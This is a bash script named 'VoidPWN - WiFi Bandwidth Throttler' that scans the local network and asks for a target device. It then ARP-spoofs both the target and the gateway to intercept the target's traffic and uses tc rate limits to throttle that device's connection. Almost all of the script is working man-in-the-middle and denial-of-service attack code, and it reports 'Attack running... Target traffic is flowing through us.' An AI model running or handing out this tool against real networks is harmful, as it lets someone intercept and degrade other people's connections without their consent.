#!/bin/bash

################################################################################
# VoidPWN - WiFi Bandwidth Throttler
# Description: Limit bandwidth for specific devices on the network
################################################################################

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# Auto-detect wireless interface using iw (handles wlan*, wlp*, wlx* naming)
detect_interface() {
    local ifaces
    ifaces=$(iw dev 2>/dev/null | awk '/Interface/{print $2}')
    if [[ -z "$ifaces" ]]; then
        ifaces=$(ip link show 2>/dev/null | awk -F': ' '/^[0-9]+: wl/{print $2}')
    fi
    if [[ -z "$ifaces" ]]; then
        echo ""
        return 1
    fi
    # Prefer non-wlan0 (usually the external pentest adapter)
    local preferred
    preferred=$(echo "$ifaces" | grep -v '^wlan0$' | head -n 1)
    echo "${preferred:-$(echo "$ifaces" | head -n 1)}"
}

INTERFACE=$(detect_interface)
if [[ -z "$INTERFACE" ]]; then
    echo -e "${RED}[!] No wireless interface detected. Connect an adapter and try again.${NC}"
    exit 1
fi

check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] This script must be run as root${NC}"
        exit 1
    fi
}

check_dependencies() {
    if ! command -v dsniff &> /dev/null; then
        echo -e "${YELLOW}[*] Installing dsniff (for arpspoof)...${NC}"
        apt-get install -y dsniff
    fi
    if ! command -v tc &> /dev/null; then
        echo -e "${YELLOW}[*] Installing iproute2 (for tc)...${NC}"
        apt-get install -y iproute2
    fi
    if ! command -v arp-scan &> /dev/null; then
        echo -e "${YELLOW}[*] Installing arp-scan...${NC}"
        apt-get install -y arp-scan
    fi
}

enable_forwarding() {
    echo 1 > /proc/sys/net/ipv4/ip_forward
    echo -e "${GREEN}[+] IP Forwarding enabled${NC}"
}

cleanup() {
    echo ""
    echo -e "${YELLOW}[*] Cleaning up...${NC}"
    # Stop ARP spoofing
    pkill arpspoof 2>/dev/null || true
    # Reset traffic control (only if INTERFACE is set)
    if [[ -n "$INTERFACE" ]]; then
        tc qdisc del dev "$INTERFACE" root 2>/dev/null || true
    fi
    # Disable forwarding
    echo 0 > /proc/sys/net/ipv4/ip_forward
    echo -e "${GREEN}[+] Done${NC}"
    exit
}

print_banner() {
    clear
    echo -e "${CYAN}"
    echo "╔═══════════════════════════════════╗"
    echo "║     WIFI SPEED LIMITER            ║"
    echo "╚═══════════════════════════════════╝"
    echo -e "${NC}"
}

main() {
    check_root
    check_dependencies
    trap cleanup SIGINT

    print_banner
    
    # Get Gateway
    GATEWAY=$(ip route | grep default | awk '{print $3}')
    if [[ -z "$GATEWAY" ]]; then
        echo -e "${RED}[!] No default gateway found. Is the interface connected to a network?${NC}"
        exit 1
    fi

    # Check for arguments
    if [[ -n "$1" ]]; then
        TARGET_IP="$1"
        SPEED="${2:-1mbit}"
        echo -e "Target: $TARGET_IP"
        echo -e "Speed: $SPEED"
    else
        echo -e "Gateway: $GATEWAY"
        
        # Select Target
        echo ""
        echo -e "${YELLOW}Scanning for devices...${NC}"
        arp-scan -l -I $INTERFACE | grep -v "Interface" | grep -v "Starting" | grep -v "Ending" | head -n -2
        
        echo ""
        read -p "Enter Target IP: " TARGET_IP
        
        if [[ -z "$TARGET_IP" ]]; then
            echo -e "${RED}Invalid IP${NC}"
            exit 1
        fi
        
        # Select Speed
        echo ""
        echo "Select Speed Limit:"
        echo "  1) 56kbps (Dial-up slow)"
        echo "  2) 256kbps (Images load slow)"
        echo "  3) 1mbps (YouTube lags)"
        echo "  4) Custom"
        read -p "Selection: " SPEED_OPT
        
        case $SPEED_OPT in
            1) SPEED="56kbit" ;;
            2) SPEED="256kbit" ;;
            3) SPEED="1mbit" ;;
            4) read -p "Enter speed (e.g. 100kbit, 1mbit): " SPEED ;;
            *) SPEED="1mbit" ;;
        esac
    fi

    echo ""
    echo -e "${GREEN}[+] Limiting $TARGET_IP to $SPEED${NC}"
    echo -e "${YELLOW}[*] Press Ctrl+C to stop${NC}"
    
    enable_forwarding
    
    # 1. Apply Traffic Control (tc)
    # Clear existing rules
    tc qdisc del dev $INTERFACE root 2>/dev/null

    # Root qdisc: HTB (default class 12 = unlimited for everyone else)
    tc qdisc add dev $INTERFACE root handle 1: htb default 12

    # Parent class (full line rate placeholder)
    tc class add dev $INTERFACE parent 1: classid 1:1 htb rate 1000mbit

    # Throttled class for the target
    tc class add dev $INTERFACE parent 1:1 classid 1:11 htb rate $SPEED ceil $SPEED

    # Default (unlimited) class for all other traffic
    tc class add dev $INTERFACE parent 1:1 classid 1:12 htb rate 1000mbit

    # Filter: traffic FROM target IP → throttled class
    tc filter add dev $INTERFACE parent 1: protocol ip prio 1 u32 \
        match ip src $TARGET_IP/32 flowid 1:11

    # Filter: traffic TO target IP → throttled class
    tc filter add dev $INTERFACE parent 1: protocol ip prio 2 u32 \
        match ip dst $TARGET_IP/32 flowid 1:11
    
    # 2. Start ARP Spoofing in background
    # Tell target that WE are the gateway
    arpspoof -i $INTERFACE -t $TARGET_IP $GATEWAY > /dev/null 2>&1 &
    # Tell gateway that WE are the target
    arpspoof -i $INTERFACE -t $GATEWAY $TARGET_IP > /dev/null 2>&1 &
    
    echo -e "${BLUE}[*] Attack running... Target traffic is flowing through us.${NC}"
    
    # Keep running until user interrupt
    wait
}

main